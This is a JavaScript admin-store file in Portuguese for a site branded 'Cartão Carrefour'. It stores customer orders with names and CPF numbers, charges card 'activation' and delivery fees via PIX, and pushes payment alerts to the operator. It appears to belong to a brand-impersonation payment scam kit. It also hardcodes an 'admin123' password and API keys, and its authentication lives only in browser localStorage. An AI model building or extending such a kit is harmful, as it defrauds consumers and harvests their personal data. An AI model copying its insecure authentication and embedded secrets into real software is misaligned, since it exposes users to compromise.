// Store para administração (pedidos e configurações)
import { create } from 'zustand';

// Funções de persistência no localStorage
const STORAGE_KEY_ORDERS = 'admin_orders';
const STORAGE_KEY_SETTINGS = 'admin_settings';
const STORAGE_KEY_AUTH = 'admin_auth';

// Helper para ler do localStorage
const getStoredOrders = () => {
  try {
    const stored = localStorage.getItem(STORAGE_KEY_ORDERS);
    return stored ? JSON.parse(stored) : [];
  } catch (e) {
    console.error('Erro ao ler pedidos do localStorage:', e);
    return [];
  }
};

const getStoredSettings = () => {
  try {
    const stored = localStorage.getItem(STORAGE_KEY_SETTINGS);
    return stored ? JSON.parse(stored) : getDefaultSettings();
  } catch (e) {
    console.error('Erro ao ler configurações do localStorage:', e);
    return getDefaultSettings();
  }
};

const getDefaultSettings = () => ({
  // Gateway
  gateway: {
    secretKey: import.meta.env.VITE_VENNOX_SECRET_KEY || '',
    companyId: import.meta.env.VITE_VENNOX_COMPANY_ID || 'a5d1078f-514b-45c5-a42f-004ab1f19afe',
    enabled: true,
  },
  // Taxas
  fees: {
    activationFee: 25.50,
    deliveryFeeRegistered: 10.00,
    deliveryFeeSedex: 25.00,
  },
  // Notificações Pushcut
  notifications: {
    pushcutApiKey: 'XPTr5Kloj05Rr37Saz0D1',
    pushcutBaseUrl: 'https://api.pushcut.io',
    notificationPendente: {
      name: 'Pendente delivery',
      title: '🛒 Novo Pedido de Cartão Carrefour',
      textTemplate: 'Um novo pedido foi gerado! 💰 Valor: R$ {valor} 📋 ID: {transactionId} ⏳ Aguardando confirmação do pagamento PIX para ativar o cartão.',
      enabled: true,
    },
    notificationAprovado: {
      name: 'Aprovado delivery',
      title: '✅ Pagamento Confirmado - Cartão Carrefour',
      textTemplate: 'Pagamento confirmado com sucesso! 💰 Valor: R$ {valor} 📋 ID: {transactionId} 🎉 O cartão será ativado em até 2 minutos. O cliente já pode visualizar os dados do cartão virtual!',
      enabled: true,
    },
  },
  // Configurações gerais
  general: {
    siteName: 'Cartão Carrefour',
    logoUrl: '/images/logocsf.png',
    primaryColor: '#0066CC',
    secondaryColor: '#00AA44',
  },
});

export const useAdminStore = create((set, get) => ({
  // Estado de autenticação
  isAuthenticated: false,
  adminPassword: null, // Hash da senha (em produção, usar bcrypt)

  // Pedidos
  orders: getStoredOrders(),

  // Configurações
  settings: getStoredSettings(),

  // Actions - Autenticação
  login: (password) => {
        // Senha padrão: "admin123" (em produção, usar hash)
        const defaultPassword = 'admin123';
        if (password === defaultPassword) {
          set({ isAuthenticated: true });
          localStorage.setItem(STORAGE_KEY_AUTH, JSON.stringify({ authenticated: true, timestamp: Date.now() }));
          return true;
        }
        return false;
  },

  logout: () => {
        set({ isAuthenticated: false });
        localStorage.removeItem(STORAGE_KEY_AUTH);
  },

  checkAuth: () => {
        try {
          const auth = localStorage.getItem(STORAGE_KEY_AUTH);
          if (auth) {
            const { authenticated, timestamp } = JSON.parse(auth);
            // Sessão expira em 24 horas
            if (authenticated && Date.now() - timestamp < 24 * 60 * 60 * 1000) {
              set({ isAuthenticated: true });
              return true;
            }
          }
        } catch (e) {
          console.error('Erro ao verificar autenticação:', e);
        }
        return false;
  },

  changePassword: (newPassword) => {
        // Em produção, fazer hash da senha
        set({ adminPassword: newPassword });
        return true;
  },

  // Actions - Pedidos
  addOrder: (orderData) => {
        const newOrder = {
          id: `ORD-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
          ...orderData,
          createdAt: new Date().toISOString(),
          status: 'pending',
          paymentStatus: 'pending',
        };
        const orders = [...get().orders, newOrder];
        set({ orders });
        localStorage.setItem(STORAGE_KEY_ORDERS, JSON.stringify(orders));
        return newOrder;
  },

  updateOrder: (orderId, updates) => {
        const orders = get().orders.map((order) =>
          order.id === orderId ? { ...order, ...updates, updatedAt: new Date().toISOString() } : order
        );
        set({ orders });
        localStorage.setItem(STORAGE_KEY_ORDERS, JSON.stringify(orders));
  },

  deleteOrder: (orderId) => {
        const orders = get().orders.filter((order) => order.id !== orderId);
        set({ orders });
        localStorage.setItem(STORAGE_KEY_ORDERS, JSON.stringify(orders));
  },

  getOrder: (orderId) => {
        return get().orders.find((order) => order.id === orderId);
  },

  // Actions - Configurações
  updateSettings: (category, updates) => {
        const settings = {
          ...get().settings,
          [category]: {
            ...get().settings[category],
            ...updates,
          },
        };
        set({ settings });
        localStorage.setItem(STORAGE_KEY_SETTINGS, JSON.stringify(settings));
  },

  updateGatewaySettings: (updates) => {
        get().updateSettings('gateway', updates);
  },

  updateFeeSettings: (updates) => {
        get().updateSettings('fees', updates);
  },

  updateNotificationSettings: (notificationType, updates) => {
        const settings = { ...get().settings };
        settings.notifications[notificationType] = {
          ...settings.notifications[notificationType],
          ...updates,
        };
        set({ settings });
        localStorage.setItem(STORAGE_KEY_SETTINGS, JSON.stringify(settings));
  },

  updateGeneralSettings: (updates) => {
        get().updateSettings('general', updates);
  },

  // Actions - Notificações
  sendNotification: async (orderId, notificationType = 'pendente') => {
        const order = get().getOrder(orderId);
        if (!order) return false;

        const settings = get().settings;
        const notificationConfig = notificationType === 'pendente'
          ? settings.notifications.notificationPendente
          : settings.notifications.notificationAprovado;

        if (!notificationConfig.enabled) {
          console.log('Notificação desabilitada');
          return false;
        }

        try {
          const { pushcutApiKey, pushcutBaseUrl } = settings.notifications;
          const url = `${pushcutBaseUrl}/${pushcutApiKey}/notifications/${encodeURIComponent(notificationConfig.name)}`;

          // Substituir variáveis no template
          const text = notificationConfig.textTemplate
            .replace('{valor}', order.valorEntrega?.toFixed(2).replace('.', ',') || '0,00')
            .replace('{transactionId}', order.transactionId?.substring(0, 8) || 'N/A')
            .replace('{nome}', order.nomeCompleto || 'Cliente')
            .replace('{cpf}', order.cpf || 'N/A');

          const response = await fetch(url, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              title: notificationConfig.title,
              text: text,
            }),
          });

          if (response.ok) {
            console.log('Notificação enviada com sucesso');
            return true;
          }
        } catch (error) {
          console.error('Erro ao enviar notificação:', error);
        }
        return false;
  },
}));

